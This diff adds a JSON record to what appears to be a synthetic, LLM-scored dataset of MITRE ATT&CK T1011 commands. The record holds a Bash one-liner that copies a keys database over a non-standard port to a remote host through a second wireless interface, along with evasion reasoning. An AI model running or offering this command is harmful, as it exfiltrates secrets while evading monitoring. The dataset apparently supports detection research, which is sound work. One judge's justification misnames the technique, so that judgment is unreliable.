@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
+  "explanation": "Performs scp over a non-standard port and binds to wlan1, exfiltrating via a different wireless medium in accordance with T1011.",
+  "rationale_steps": [
+    "Monitor wlan1 readiness using iwconfig.",
+    "Bind SSH to the wlan1 IP to ensure traffic uses the alternate Wi\u2011Fi link.",
+    "Copy the file over an uncommon port to reduce overlap with standard SSH monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-84523189",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quotes, valid redirections, proper command substitution, and valid scp/ssh options.",
+        "semantic_score": 1,
+        "semantic_justification": "The command conducts basic scp exfiltration via a specified interface and nonstandard port but does not embed or convey signals within traffic as required by T1011 Traffic Signaling.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:25:56.006760Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced syntax, valid commands, flags, arguments, and correct use of command separators and sub-command expansion.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by performing SCP exfiltration over a non-standard port and explicitly binding to a specific wireless interface, leveraging evasion tactics outlined in T1011 (protocol mimicry, use of out-of-band fields, and combining with exfiltration).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T15:26:51.712036Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
